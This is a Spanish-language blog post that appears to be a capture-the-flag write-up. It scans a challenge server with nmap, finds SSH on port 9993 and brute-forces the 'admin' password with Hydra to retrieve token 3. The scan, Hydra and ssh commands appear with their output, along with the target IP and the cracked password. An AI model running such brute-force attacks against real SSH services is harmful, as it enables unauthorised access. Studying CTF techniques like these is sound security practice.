---
layout: post
title:  Reto 3 Hacking CTF ... Flag del puerto 9993/tcp
---

Bien, nos vamos a la búsqueda de un tercer flag y nos fijaremos por seguir un orden secuencial, en el siguiente puerto abierto descubierto por nmap:  **9993/tcp**

Recordamos con un extracto del escaneo :

``` markdown
#nmap -p- --open -v -Pn 82.165.37.232 -oG initScan
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-03 19:21 CET
Initiating Parallel DNS resolution of 1 host. at 19:21
Completed Parallel DNS resolution of 1 host. at 19:21, 0.03s elapsed
Initiating SYN Stealth Scan at 19:21
Scanning s21356626.onlinehome-server.info (82.165.37.232) [65535 ports]
Discovered open port 9999/tcp on 82.165.37.232
Discovered open port 9994/tcp on 82.165.37.232
Discovered open port 9991/tcp on 82.165.37.232
Discovered open port 9997/tcp on 82.165.37.232
......

**Discovered open port 9993/tcp on 82.165.37.232**
Discovered open port 9996/tcp on 82.165.37.232
Discovered open port 2222/tcp on 82.165.37.232
Completed SYN Stealth Scan at 9:22, 98.31s elapsed (65535 total ports)
Nmap scan report for s21356626.onlinehome-server.info (82.165.37.232)
Host is up (0.22s latency).
Not shown: 65523 closed ports
PORT      STATE SERVICE
2222/tcp  open  EtherNetIP-1
9991/tcp  open  issa
9992/tcp  open  issc
9993/tcp  open  palace-2

```

La definición del servicio *palace-2* que corre sobre el puerto 9993/tcp ,reconocido por nmap no nos dice nada. Lanzo una conexión telnet al puerto 993/TCP para ver cómo me responde y .... 

``` 
root@ip-172-31-29-174:/home/ubuntu# telnet 82.165.37.232 9993
Trying 82.165.37.232...
Connected to 82.165.37.232.
Escape character is '^]'.
SSH-2.0-OpenSSH_7.7

```

¡Mira! : Nos ofrece una conexion SSH .
Así pues el servicio 9993/tcp, concretamente está a la escucha para ofrecer un servidor **SSH-2.0-OpenSSH_7.7** , pero se ha intentado ofuscar el servicio de conexión segura sustituyéndolo por el 443/tcp habitual:

Vale pues intentaremos acceder. Por fuerza bruta  y empleando una herramienta de descubrimiento de credenciales de acceso sobre servicios en red como Hydra, comprobando claves de diccionario cuyo origen es el listado de claves **nmap.lst** (obviamente de nmap), y concretamente sobre servidor el servidor SSH. No conocemos ninguna credencial de usuario ni password, pero vamos a intentar descubrir la contraseña tomando como prueba el usuario clásico y habitual, **admin**.... y (manda narices), tras varios minutoas,  tenemos **éxito** :

```markdown

┌─[✗]─[root@parrot-virtual]─[/usr/share/wordlists]
└──╼ #hydra -l admin -P nmap.lst ssh://82.165.37.232:9993 -v -I
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-01-12 20:03:29
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 5010 login tries (l:1/p:5010), ~314 tries per task
[DATA] attacking ssh://82.165.37.232:9993/
[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
[INFO] Testing if password authentication is supported by ssh://admin@82.165.37.232:9993
[INFO] Successful, password authentication is supported by ssh://82.165.37.232:9993
[ERROR] could not connect to target port 9993: Socket error: disconnected
..........
[VERBOSE] Retrying connection for child 9
[STATUS] 178.00 tries/min, 178 tries in 00:01h, 4834 to do in 00:28h, 16 active
[ERROR] could not connect to target port 9993: Socket error: disconnected
...........
[ERROR] ssh protocol error
[VERBOSE] Retrying connection for child 11
[ERROR] could not connect to target port 9993: Socket error: disconnected
[ERROR] ssh protocol error
[VERBOSE] Retrying connection for child 11
  `[9993][ssh] host: 82.165.37.232   login: admin   password: letmein`
[STATUS] attack finished for 82.165.37.232 (waiting for children to complete tests)
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 2 final worker threads did not complete until end.
[ERROR] 2 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-01-12 20:05:42
```

Para ver la imagen gráfica de la operación observamos la captura original:

<img src="{{ site.baseurl }}/public/Reto3_ssh.png">

```

root@ip-172-31-29-174:/home/ubuntu# ssh -p 9993 admin@82.165.37.232
############################################################
#                                                          #
#                                                          #
# Acceso denegado. Solo el usuario <admin> puede conectar. #
#                                                          #
#                                                          #
############################################################
admin@82.165.37.232's password: 
Token 3: 8842130e8deeee7f821e77e14d69cb98
Connection to 82.165.37.232 closed.

```

>Token 3: 8842130e8deeee7f821e77e14d69cb98
